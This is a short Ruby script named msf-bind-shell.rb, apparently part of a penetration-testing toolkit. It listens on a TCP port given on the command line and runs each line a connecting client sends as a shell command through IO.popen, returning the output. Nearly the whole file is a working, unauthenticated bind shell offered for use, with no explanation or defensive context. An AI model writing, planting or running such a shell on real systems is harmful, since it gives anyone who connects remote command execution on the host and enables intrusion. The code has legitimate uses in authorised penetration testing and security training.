#!/usr/bin/ruby
#
# msf-bind-shell.rb version 0.1
#
# babel-sf ( https://github.com/attackdebris/babel-sf )
#
require 'socket'

TIME = Time.now.strftime("%Y-%m-%d %H:%M")

if ARGV.empty?
    puts "msf-bind-shell.rb ( https://github.com/attackdebris/babel-sf )"
    puts "\r\n"
    puts "Usage:"
    puts "ruby msf-bind-shell.rb [bind port]"
    puts "e.g. ruby msf-binshell.rb 4444"
else
  puts "Starting msf-bind-shell.rb ( https://github.com/attackdebris/babel-sf ) at #{TIME}"
  puts "Listening on TCP port #{ARGV[0]}...."
  s=TCPServer.new(ARGV[0]);while(c=s.accept);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end;end
end